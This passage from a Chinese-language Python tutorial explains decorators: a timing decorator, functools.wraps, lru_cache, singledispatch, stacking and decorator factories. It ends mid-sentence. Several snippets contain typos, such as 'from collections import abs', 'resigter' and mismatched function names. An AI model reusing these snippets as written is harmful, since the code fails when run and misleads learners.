<h2 id="实现一个简单的装饰器"><a href="#实现一个简单的装饰器" class="headerlink" title="实现一个简单的装饰器"></a>实现一个简单的装饰器</h2><p>下面，我们实现一个为函数的每次调用计时的装饰器，使某函数在每次被调用后就打印函数调用的时间、传入的参数、调用的返回值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clock</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clocked</span><span class="params">(*args)</span>:</span></span><br><span class="line">        t0 = time.perf_counter()</span><br><span class="line">        result = func(*args)</span><br><span class="line">        elapsed = time.perf_counter() - t0</span><br><span class="line">        name = func.__name__</span><br><span class="line">        arg_str = <span class="string">', '</span>.join(repr(arg) <span class="keyword">for</span> arg <span class="keyword">in</span> args)</span><br><span class="line">        print(<span class="string">"[%0.8fs] %s(%s) -&gt; %r"</span> % (elapsed, name, arg_str, result))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> clocked</span><br></pre></td></tr></table></figure>

<ol>
<li>我们定义了一个内嵌函数 <code>clocked</code>，它可以接受任意个数的参数</li>
<li><code>clocked</code> 捕获了自由变量 <code>fun</code></li>
<li><code>clock</code> 会返回内嵌函数 <code>clocked</code> 来代替原来的函数</li>
</ol>
<p>下面的代码使用了 <code>clock</code> 装饰器</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ex15 <span class="keyword">import</span> clock</span><br><span class="line"></span><br><span class="line"><span class="meta">@clock</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">snooze</span><span class="params">(seconds)</span>:</span></span><br><span class="line">    time.sleep(seconds)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@clock</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factorial</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> n &lt; <span class="number">2</span> <span class="keyword">else</span> n * factorial(n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">'*'</span> * <span class="number">40</span>, <span class="string">"Calling snooze(.123)"</span>)</span><br><span class="line">    snooze(<span class="number">.123</span>)</span><br><span class="line">    print(<span class="string">'*'</span> * <span class="number">40</span>, <span class="string">"Calling factorial(6)"</span>)</span><br><span class="line">    print(<span class="string">"6! ="</span>, factorial(<span class="number">6</span>))</span><br></pre></td></tr></table></figure>

<p>上面代码的输出是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">**************************************** Calling snooze(.123)</span><br><span class="line">[0.12784183s] snooze(0.123) -&gt; None</span><br><span class="line">**************************************** Calling factorial(6)</span><br><span class="line">[0.00000130s] factorial(1) -&gt; 1</span><br><span class="line">[0.00004024s] factorial(2) -&gt; 2</span><br><span class="line">[0.00006179s] factorial(3) -&gt; 6</span><br><span class="line">[0.00007902s] factorial(4) -&gt; 24</span><br><span class="line">[0.00009839s] factorial(5) -&gt; 120</span><br><span class="line">[0.00012213s] factorial(6) -&gt; 720</span><br><span class="line">6! &#x3D; 720</span><br></pre></td></tr></table></figure>

<h3 id="它是怎么工作的呢"><a href="#它是怎么工作的呢" class="headerlink" title="它是怎么工作的呢"></a>它是怎么工作的呢</h3><p>要知道代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@clock</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factorial</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> n &lt; <span class="number">2</span> <span class="keyword">else</span> n * factorial(n - <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>实际上是做的是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factorial</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> n &lt; <span class="number">2</span> <span class="keyword">else</span> n * factorial(n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">factorial = clock(factorial)</span><br></pre></td></tr></table></figure>

<p>在两个例子中，<code>clock</code> 将 <code>factorial</code> 作为参数，然后创建并返回 <code>clocked</code> 函数，最后，Python 解释器将 <code>factorial</code> 绑定到 <code>clocked</code>。实际上，如果我们检查 <code>factorial</code> 的 <code>__name__</code> 属性，可以得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; clockdeco_demo.factorial.__name__</span><br><span class="line">&quot;clocked&quot;</span><br></pre></td></tr></table></figure>

<p>所以，<code>factorial</code> 实际上保存了指向 <code>clocked</code> 的引用。从现在开始，每次调用 <code>factorial(n)</code>，实际上会执行的是 <code>clocked</code>。而 <code>clocked</code> 的执行步骤为：</p>
<ol>
<li>记录初始时间 t0</li>
<li>调用原来的 <code>factorial</code> 函数，保存结果</li>
<li>计算得到结果的花费时间</li>
<li>格式化并打印收集到的数据</li>
<li>返回保存的计算结果</li>
</ol>
<p>这是装饰器的典型的行为：它用接受相同参数的新的函数来代替被装饰的函数，并且在返回被装饰函数应该返回的结果的基础上，做额外的工作。</p>
<p>在上面例子中的装饰器有一些缺点：它不接受关键字参数，它覆盖了被装饰函数的 <code>__name__</code> 和 <code>__doc__</code> 属性。下面的例子中，我们使用 <code>functools.wraps</code> 装饰器将 <code>func</code> 的属性拷贝到 <code>clocked</code> 属性中。而且，新版本的装饰器也可以接受关键字参数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clock</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @functools.wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clocked</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        t0 = time.time()</span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        elapsed = time.time() - t0</span><br><span class="line">        name = func.__name__</span><br><span class="line">        arg_lst = []</span><br><span class="line">        <span class="keyword">if</span> args:</span><br><span class="line">            arg_lst.append(<span class="string">', '</span>.join(repr(arg) <span class="keyword">for</span> arg <span class="keyword">in</span> args))</span><br><span class="line">        <span class="keyword">if</span> kwargs:</span><br><span class="line">            pairs = [<span class="string">"%s=%r"</span> % (k, w) <span class="keyword">for</span> k, w <span class="keyword">in</span> sorted(kwargs.items())]</span><br><span class="line">            arg_lst.append(<span class="string">', '</span>.join(pairs))</span><br><span class="line">        arg_str = <span class="string">', '</span>.join(arg_lst)</span><br><span class="line">        print(<span class="string">"[%0.8fs] %s(%s) -&gt; %r"</span> % (elapsed, name, arg_str, result))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> clocked</span><br></pre></td></tr></table></figure>

<p><code>functools.wraps</code> 仅仅是标准库中直接可用的装饰器之一。我们来研究两个 <code>functools</code> 提供的两个强大的装饰器 <code>lru_cache</code> 和 <code>singleddispatch</code>。</p>
<h2 id="标准库中的装饰器"><a href="#标准库中的装饰器" class="headerlink" title="标准库中的装饰器"></a>标准库中的装饰器</h2><p>标准库中最有趣的两个装饰器是 <code>lru_cache</code> 和 <code>singledispatch</code>，它们都被被定义在 <code>functools</code> 中。</p>
<h3 id="functools-lru-cache-实现记忆化"><a href="#functools-lru-cache-实现记忆化" class="headerlink" title="functools.lru_cache 实现记忆化"></a>functools.lru_cache 实现记忆化</h3><p><code>functools.lru_cache</code> 是一个非常实用的装饰器，它实现了计算的记忆化。记忆化是通过将之前的计算结果缓存，从而避免重复计算的优化技术。LRU 是 Least Recently Used（最近最久未使用）的缩写，意思是通过丢弃暂时没有使用的单元来限制缓存的大小。</p>
<p>我们可以使用 <code>lru_cache</code> 来优化计算 Fibonacci 的递归函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> clockdeco2 <span class="keyword">import</span> clock</span><br><span class="line"></span><br><span class="line"><span class="meta">@clock</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    <span class="keyword">return</span> fibonacci(n - <span class="number">2</span>) + fibonacci(n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(fibonacci(<span class="number">6</span>))</span><br></pre></td></tr></table></figure>

<p>这是一个非常低效的版本，这一点我们可以从它的输入信息看出来：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[0.00000119s] fibonacci(0) -&gt; 0</span><br><span class="line">[0.00000119s] fibonacci(1) -&gt; 1</span><br><span class="line">[0.00006604s] fibonacci(2) -&gt; 1</span><br><span class="line">[0.00000119s] fibonacci(1) -&gt; 1</span><br><span class="line">[0.00000095s] fibonacci(0) -&gt; 0</span><br><span class="line">[0.00000095s] fibonacci(1) -&gt; 1</span><br><span class="line">[0.00002599s] fibonacci(2) -&gt; 1</span><br><span class="line">[0.00004578s] fibonacci(3) -&gt; 2</span><br><span class="line">[0.00013208s] fibonacci(4) -&gt; 3</span><br><span class="line">[0.00000000s] fibonacci(1) -&gt; 1</span><br><span class="line">[0.00000095s] fibonacci(0) -&gt; 0</span><br><span class="line">[0.00000000s] fibonacci(1) -&gt; 1</span><br><span class="line">[0.00001907s] fibonacci(2) -&gt; 1</span><br><span class="line">[0.00003767s] fibonacci(3) -&gt; 2</span><br><span class="line">[0.00000119s] fibonacci(0) -&gt; 0</span><br><span class="line">[0.00000095s] fibonacci(1) -&gt; 1</span><br><span class="line">[0.00001907s] fibonacci(2) -&gt; 1</span><br><span class="line">[0.00000119s] fibonacci(1) -&gt; 1</span><br><span class="line">[0.00000000s] fibonacci(0) -&gt; 0</span><br><span class="line">[0.00000119s] fibonacci(1) -&gt; 1</span><br><span class="line">[0.00001907s] fibonacci(2) -&gt; 1</span><br><span class="line">[0.00003791s] fibonacci(3) -&gt; 2</span><br><span class="line">[0.00007606s] fibonacci(4) -&gt; 3</span><br><span class="line">[0.00013065s] fibonacci(5) -&gt; 5</span><br><span class="line">[0.00028324s] fibonacci(6) -&gt; 8</span><br><span class="line">8</span><br></pre></td></tr></table></figure>

<p>代码的低效是很明显的，<code>fibonacci(1)</code> 被计算了8次，<code>fibonacci(2)</code> 被计算了5次。但是如果我们添加了 <code>lru_cache</code>，性能会得到很大提升。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> clockdeco2 <span class="keyword">import</span> clock</span><br><span class="line"></span><br><span class="line"><span class="meta">@functools.lru_cache()</span></span><br><span class="line"><span class="meta">@clock</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibnocci</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    <span class="keyword">return</span> fibnocci(n - <span class="number">2</span>) + fibnocci(n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(fibnocci(<span class="number">6</span>))</span><br></pre></td></tr></table></figure>

<ol>
<li><code>lru_cache</code> 必须写成函数调用的形式，注意后面的括号。这是因为它可以接受配置信息。</li>
<li>这是一个堆叠装饰器的例子，<code>@lru_cacha()</code> 修饰被 <code>@clock</code> 返回的函数</li>
</ol>
<p>上面的代码将运行时间缩短了一半，消除了所有的重复计算</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[0.00000119s] fibnocci(0) -&gt; 0</span><br><span class="line">[0.00000215s] fibnocci(1) -&gt; 1</span><br><span class="line">[0.00011992s] fibnocci(2) -&gt; 1</span><br><span class="line">[0.00000167s] fibnocci(3) -&gt; 2</span><br><span class="line">[0.00015306s] fibnocci(4) -&gt; 3</span><br><span class="line">[0.00000095s] fibnocci(5) -&gt; 5</span><br><span class="line">[0.00018692s] fibnocci(6) -&gt; 8</span><br><span class="line">8</span><br></pre></td></tr></table></figure>

<p>在另一个测试中，计算 <code>fibonacci(30)</code> 没有使用 <code>lru_cache</code> 的版本需要调用 <code>fibonacci</code> 2,692,537 次，花费 17.7秒，而优化有的版本仅仅调用 31 次，仅仅花费 0.0005秒。</p>
<p>除了优化递归函数外，<code>lru_cache</code> 还可以被应用于从 Web 获取数据的应用程序。</p>
<p>我们可以通过传入两个可选参数来调整 <code>lru_cache</code> 的行为，它的完整函数名称为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">functools.lru_cache(maxsize=<span class="number">128</span>, typed=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p><code>maxsize</code> 参数确定了最多有多少和单元可以被缓存，如果缓存被填满，旧的单元将被删除。为了性能考虑，<code>maxsize</code> 通常应该是 2 的幂。<code>type</code> 如果被设置为 True，不同的参数类型的结果就会被分开存储，例如传入 float 和 int 作为参数的 1.0 和 1 的两次计算结果会被分开存储。另外，应为 <code>lru_cache</code> 使用了 dict 来存储数据，字典的键是根据传入的参数来确定的，所以参数都必须 hashable。</p>
<h3 id="Single-Disptch-实现泛型函数"><a href="#Single-Disptch-实现泛型函数" class="headerlink" title="Single Disptch 实现泛型函数"></a>Single Disptch 实现泛型函数</h3><p>假设我们要开发一个调试 Web 应用程序的工具。我们希望为不同的 Python 对象生成不同的 HTML 文本。</p>
<p>我们可以从一个函数开始：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">htmlize</span><span class="params">(obj)</span>:</span></span><br><span class="line">    content = html.escape(repr(obj))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"&lt;pre&gt;&#123;&#125;&lt;/pre&gt;"</span>.format(content)</span><br></pre></td></tr></table></figure>

<p>这段代码可以作用与任何 Python 类型，但是我们想拓展它来为一些类型生成不同的文本：</p>
<ul>
<li>str：将内嵌的换行符用 “&lt;<em>br</em>&gt;\n” 替换，使用 &lt;<em>p</em>&gt; 而不是 &lt;<em>pre</em>&gt;</li>
<li>int：用十进制和十六进制来显示数字</li>
<li>list： 输出一个 HTML 列表，根据不同元素类型来格式化每一行</li>
</ul>
<p>我们希望的行为如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; htmlize(&#123;1, 2, 3&#125;)</span><br><span class="line">&#39;&lt;pre&gt;&#123;1, 2, 3&#125;&lt;&#x2F;pre&gt;&#39;</span><br><span class="line">&gt;&gt;&gt; htmlize(abs)</span><br><span class="line">&#39;&lt;pre&gt;&lt;built-in function abs&gt;&lt;&#x2F;pre&gt;&#39;</span><br><span class="line">&gt;&gt;&gt; htmlize(&quot;Heimlich &amp; Co.\n- a game&quot;)</span><br><span class="line">&#39;&lt;p&gt;Heimlich &amp; Co.&lt;br&gt;\n- a game&lt;&#x2F;p&gt;&#39;</span><br><span class="line">&gt;&gt;&gt; htmlize(42)</span><br><span class="line">&#39;&lt;pre&gt;42 (0x2a)&lt;&#x2F;pre&gt;&#39;</span><br><span class="line">&gt;&gt;&gt; print(htmlize([&quot;alpha&quot;, 66, &#123;3, 2, 1&#125;]))</span><br><span class="line">&lt;ul&gt; </span><br><span class="line">    &lt;li&gt;&lt;p&gt;alpha&lt;&#x2F;p&gt;&lt;&#x2F;li&gt; </span><br><span class="line">    &lt;li&gt;&lt;pre&gt;66 (0x42)&lt;&#x2F;pre&gt;&lt;&#x2F;li&gt; </span><br><span class="line">    &lt;li&gt;&lt;pre&gt;&#123;1, 2, 3&#125;&lt;&#x2F;pre&gt;&lt;&#x2F;li&gt; </span><br><span class="line">&lt;&#x2F;ul&gt;</span><br></pre></td></tr></table></figure>

<p>因为 Python 中没有函数重载，我们不懂通过控制函数的类型来重载 <code>htmlize</code>。Python 中一种普遍的方式是将 <code>htmlize</code> 变为一个分发函数，也就是使用 <code>if/elif/else</code> 将操作分发到 <code>htmlize_str</code>, <code>htmlize_int</code> 等。这种方式是补课拓展的，随着不同类型操作的增加，我们代码中的 <code>if/elif</code> 也会越来越长，代码间的耦合度过于紧密了。</p>
<p>新的 <code>functools.singledispatch</code> 装饰器在 Python 3.4 中引入，它允许我们增加新的特化函数。如果我们用 <code>@singledispatch</code> 装饰一个函数，这个函数就变成了一个 <code>generic function</code> 泛型函数：用不同方法来解决相同问题的一组函数，它们根据参数的类型选择应该执行的操作。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> singledispatch</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> abs</span><br><span class="line"><span class="keyword">import</span> numbers</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@singledispatch</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">htmllize</span><span class="params">(obj)</span>:</span></span><br><span class="line">    content = html.escape(repr(obj))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"&lt;pre&gt;&#123;&#125;&lt;/pre&gt;"</span>.format(content)</span><br><span class="line"></span><br><span class="line"><span class="meta">@htmllize.register(str)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_</span><span class="params">(text)</span>:</span></span><br><span class="line">    content = html.escape(text).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br&gt;\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;p&gt;&#123;0&#125;&lt;/p&gt;'</span>.format(content)</span><br><span class="line"></span><br><span class="line"><span class="meta">@htmllize.resigter(numbers.Integral)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;pre&gt;&#123;0&#125; (0x&#123;0:x&#125;)&lt;/pre&gt;'</span>.format(n)</span><br><span class="line"></span><br><span class="line"><span class="meta">@htmllize.register(tuple)</span></span><br><span class="line"><span class="meta">@htmllize.register(abs.MutableSequence)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_</span><span class="params">(seq)</span>:</span></span><br><span class="line">    inner = <span class="string">'&lt;/li&gt;\n&lt;li&gt;'</span>.join(htmlize(item) <span class="keyword">for</span> item <span class="keyword">in</span> seq)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;ul&gt;\n&lt;li&gt;'</span> + inner + <span class="string">'&lt;/li&gt;\n&lt;/ul&gt;'</span></span><br></pre></td></tr></table></figure>

<ol>
<li><code>@singledispatch</code> 标记了处理 object 的基函数</li>
<li>每一种特化函数都用 <code>@&lt;base_function&gt;.register(&lt;type&gt;)</code> 来装饰，它们的函数名无关紧要，<code>_</code>是一个好的选择</li>
<li>我们也可以叠加多个装饰器来用一个函数来处理几种参数</li>
</ol>
<p>如果可能的话，尽量使用抽象类型，如 <code>numbers.Intergral</code> 和 <code>abs.MutableSequence</code>，而不是具体类型如 <code>int</code> 或 <code>list</code> 来注册特化函数，这样，我们的函数可以支持更多的兼容类型。</p>
<p>我们可以使用 <code>singledispatch</code> 在系统的任意位置注册特化函数。如果我们在一个新的模块添加了新的自定义类型，我们可以直接在新的模块中添加处理该类型的代码。我们我也可为不是自己所写，也无权修改的函数添加自定义的实现。</p>
<p><code>singledispatch</code> 的完整特性可以查看 <a href="https://www.python.org/dev/peps/pep-0443/" target="_blank" rel="noopener">PEP 443 - Single-dispatch generic functions</a></p>
<p>因为装饰器本质上是函数，所谓我们可以组合它们。</p>
<h2 id="Stacked-Decorators"><a href="#Stacked-Decorators" class="headerlink" title="Stacked Decorators"></a>Stacked Decorators</h2><p>当两个装饰器 <code>@d2</code> 和 <code>@d1</code> 依次作用于函数 <code>f</code> 后，结果其实就是 <code>f = d1(d2(f2))</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@d1</span></span><br><span class="line"><span class="meta">@d2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'f'</span>)</span><br></pre></td></tr></table></figure>

<p>相当于</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'f'</span>)</span><br><span class="line"></span><br><span class="line">f = d1(d2(f))</span><br></pre></td></tr></table></figure>

<h2 id="装饰器的参数化"><a href="#装饰器的参数化" class="headerlink" title="装饰器的参数化"></a>装饰器的参数化</h2><p>当在源代码中解析装饰器时，Python 将被装饰的函数作为第一个参数传入装饰器。所以我们要如何让装饰器接受其他的参数呢？答案是首先创建一个接受额外参数的装饰器工厂，然后再用它生成装饰器。很乱吧？我们通过一个例子来理解：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">registry = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(func)</span>:</span></span><br><span class="line">    print(<span class="string">"running register(%s)"</span> % func)</span><br><span class="line">    registry.append(func)</span><br><span class="line">    <span class="keyword">return</span> func</span><br><span class="line"></span><br><span class="line"><span class="meta">@register</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"funning f1()"</span>)</span><br><span class="line">    </span><br><span class="line">print(<span class="string">"running main()"</span>)</span><br><span class="line">print(<span class="string">"registry -&gt; "</span>, registry)</span><br><span class="line">f1()</span><br></pre></td></tr></table></figure>

<p>为了让启用和禁用函数注册更加容易，我们让装饰器接受一个额外的参数 <code>active</code>，如果为 False，则跳过被注册函数。下面的代码实现了这个功能。从概念上讲，新的 <code>register</code> 函数不是一个装饰器，而是一个装饰器工厂函数，它根据参数，返回相应的装饰器。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">registry = set()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(active=True)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorate</span><span class="params">(func)</span>:</span></span><br><span class="line">        print(<span class="string">"running register(active=%s)-&gt;decorate(%s)"</span> % (active, func))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> active:</span><br><span class="line">            registry.add(func)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            registry.discard(func)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> func</span><br><span class="line">    <span class="keyword">return</span> decorate</span><br><span class="line"></span><br><span class="line"><span class="meta">@register(active=False)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"running f1()"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@register()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"running f2()"</span>)</span><br></pre></td></tr></table></figure>

<p>这里的重点在于 <code>register()</code> 返回装饰器 <code>decorate</code>，被返回的装饰器再作用于函数。</p>
<p>我们在中断导入这个模块可以看到：</p>
